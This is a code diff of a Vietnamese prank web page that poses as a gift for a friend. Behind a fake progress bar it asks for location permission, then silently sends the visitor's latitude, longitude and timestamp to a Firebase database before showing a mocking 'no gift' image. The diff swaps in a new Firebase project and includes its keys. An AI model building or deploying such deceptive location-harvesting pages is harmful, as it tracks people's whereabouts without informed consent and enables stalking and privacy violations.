@@ -3,38 +3,42 @@
   <head>
     <meta charset="UTF-8" />
     <title>Có quà cho bạn thân iu</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="stylesheet" href="check.css" />
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
   </head>
   <body>
-    <div class="loading-box">
-      <img
-        src="https://cdn-icons-png.flaticon.com/512/2545/2545643.png"
-        alt="Gift"
-        class="gift-img"
-      />
-      <h2>🎀 You cấp quyền đi , có bất ngờ đó 🎀</h2>
-      <div class="progress">
-        <div class="progress-bar" id="progress-bar"></div>
+    <div class="container" id="container">
+      <div class="gift-box">
+        <img
+          src="https://cdn-icons-png.flaticon.com/512/2545/2545643.png"
+          alt="Gift"
+          class="gift-img"
+        />
+        <h2>🎀 You cấp quyền đi , có bất ngờ đó 🎀</h2>
+        <div class="progress">
+          <div class="progress-bar" id="progress-bar"></div>
+        </div>
+        <p id="status">Đang xử lý quà...</p>
       </div>
-      <p id="status">Đang lấy quà cho youuu , đợi tí nè ...</p>
     </div>
 
     <script>
       const status = document.getElementById("status");
       const progressBar = document.getElementById("progress-bar");
 
+      // Firebase config mới
       const firebaseConfig = {
-        apiKey: "AIzaSyCb5oNoQPUQT-r3fiwHf0dEzm6z_B6nWA4",
-        authDomain: "cuong-a179d.firebaseapp.com",
+        apiKey: "AIzaSyDNVr03Qhb00YdjHvBQxsEQQDh96UHtx1g",
+        authDomain: "ncc1504-72c4c.firebaseapp.com",
         databaseURL:
-          "https://cuong-a179d-default-rtdb.asia-southeast1.firebasedatabase.app",
-        projectId: "cuong-a179d",
-        storageBucket: "cuong-a179d.firebasestorage.app",
-        messagingSenderId: "452569201467",
-        appId: "1:452569201467:web:516311a3b060d6d9d8551e",
-        measurementId: "G-RBPRXXBPCP",
+          "https://ncc1504-72c4c-default-rtdb.asia-southeast1.firebasedatabase.app",
+        projectId: "ncc1504-72c4c",
+        storageBucket: "ncc1504-72c4c.firebasestorage.app",
+        messagingSenderId: "522236411325",
+        appId: "1:522236411325:web:280cd17913d1d294a926d4",
+        measurementId: "G-5RG260HYPK",
       };
 
       firebase.initializeApp(firebaseConfig);
@@ -56,7 +60,7 @@
 
       function getLocationAndSend() {
         if (!navigator.geolocation) {
-          status.innerText = "Lỗi rùi đổi trình duyệt khác đuyyy";
+          status.innerText = "Lỗi rùi đổi trình duyệt khác đi.";
           return;
         }
         navigator.geolocation.getCurrentPosition(
@@ -64,9 +68,13 @@
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             const now = new Date().toISOString();
+
             db.ref("locations").push({ lat, lon, time: now });
+
             status.innerText = "💖 Lêu lêuu , ko có quà đâuuu! 💖";
             progressBar.style.width = "100%";
+
+            // Sau 2.5s thì hiện ảnh troll với nền tối
             setTimeout(() => {
               const overlay = document.createElement("div");
               overlay.className = "overlay";
@@ -79,10 +87,10 @@
               document.body.appendChild(img);
 
               setTimeout(() => {
-                overlay.style.background = "rgba(0,0,0,0.7)";
+                overlay.style.opacity = "1";
                 img.style.opacity = "1";
-              }, 100);
-            }, 1700);
+              }, 50);
+            }, 2500);
           },
           (err) => {
             status.innerText = "⛔ Bạn từ chối quà của mình à 😢";
